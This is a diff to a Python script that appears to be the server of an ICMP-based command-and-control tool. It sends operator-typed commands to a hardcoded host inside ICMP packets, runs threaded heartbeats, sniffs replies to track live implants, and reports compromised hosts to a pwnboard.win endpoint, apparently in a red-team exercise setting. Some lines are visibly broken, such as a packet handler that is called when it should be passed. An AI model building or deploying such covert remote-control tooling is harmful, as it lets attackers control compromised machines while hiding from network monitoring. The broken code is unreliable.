@@ -5,12 +5,21 @@ import threading
 import random
 import requests
 import json
+import time
 from db import Connector
+
+def threaded(fn):
+    def wrapper(*args, **kwargs):
+        thread = threading.Thread(target=fn, args=args, kwargs=kwargs)
+        thread.start()
+        return thread
+    return wrapper
 
 class Server:
     def __init__(self):
         self.verbose = False
-        self.db = Connector()
+        self.alive = []
+        #self.db = Connector()
         with open("test.txt") as file:
             csv_reader = csv.reader(file, delimiter=',')
             for row in csv_reader:
@@ -47,8 +56,8 @@ class Server:
 
     def sender(self, dest, cmd, protype, protcode):
         print("DEST")
-        #rpckt = sr1(IP(dst=self.iplook(dest))/ICMP(type=protype, code=protcode)/cmd)#Fix this to use the database instead
-        #return rpckt
+        send(IP(dst=dest)/ICMP(type=protype, code=protcode)/cmd)#Fix this to use the database instead
+
 
     def send_cmd(self):
         #typ = random.randint(44,94)
@@ -58,18 +67,25 @@ class Server:
         cmd =  input("Command:")
         self.sender(target, cmd, typ, code)
 
-    def heartbeat(self):
-        alive = []
-        ips = self.db.heart_ips_test()
+    def heartbeats(self):
+        ips = ["192.168.232.129"]#self.db.heart_ips_test()
         for ip in ips:
-            print(ip[0])
+            #print(ip)
             typ = 146
             code = 0
-            pkt = self.sender(ip, "abcdefghijklmnopqrstuvwxyz",typ,code)
+            checked = self.sender(ip, "abcdefghijklmnopqrstuvwxyz",typ,code)
             #Do if logic later
-            alive.append(str(pkt.getlayer(IP).src))
-        self.sendUpdate(alive, name="PingNet")
-        
+        #time.sleep(5000)
+        #self.alive = []
+        #self.sendUpdate(alive, name="PingNet")
+    @threaded
+    def heartbeat(self):
+        ip = "192.168.232.129"
+        while True:
+            typ = 146
+            code = 0
+            self.sender(ip, "abcdefghijklmnopqrstuvwxyz",typ,code)
+            time.sleep(2)
     
     def file_transfer(self, fname):
         with open(fname, "rb") as fsend:
@@ -79,18 +95,24 @@ class Server:
     def encryptor(self):
         pass #This is necessary
 
-    def sniffer(self):
-    sniff(filter="icmp", prn=resp_mgmt)
-    # These packets will come in periodically. The heartbeat will just have 1pkt that will have the str hb
 
-    def resp_mgmt(self, pkt, type):
+    def resp_mgmt(self, pkt):
+        print("recievied")
         if str(pkt.getlayer(ICMP).type) == "146":
             if str(pkt.getlayer(ICMP).code) == "1":
                 print("Heartbeat Recieved")
+                self.alive.append(pkt.getlayer(IP).src)
+                #print(self.alive)
         print(pkt.show())
         print(pkt.getlayer(ICMP).type)
         data = pkt.getlayer(ICMP).load.decode()
         print(data)
+
+    @threaded
+    def sniffer(self):
+        print("Sniffing")
+        sniff(filter="icmp", prn=self.resp_mgmt())
+    # These packets will come in periodically. The heartbeat will just have 1pkt that will have the str hb
     
     def sendUpdate(self, ips, name="PingNet"):
         host = "http://pwnboard.win/generic"
@@ -105,6 +127,21 @@ class Server:
             print(E)
             return False
 
+class Sniffer(Thread):
+    def  __init__(self, interface="eth0"):
+        super().__init__()
+
+        self.interface = interface
+
+    def run(self):
+        sniff(iface=self.interface, filter="icmp", prn=self.print_packet)
+
+    def print_packet(self, packet):
+        ip_layer = packet.getlayer(IP)
+        print("[!] New Packet: {src} -> {dst}".format(src=ip_layer.src, dst=ip_layer.dst))
 
 server = Server()
-server.heartbeat()
+h1 = server.sniffer()
+h2 = server.heartbeat()
+h1.join()
+h2.join()
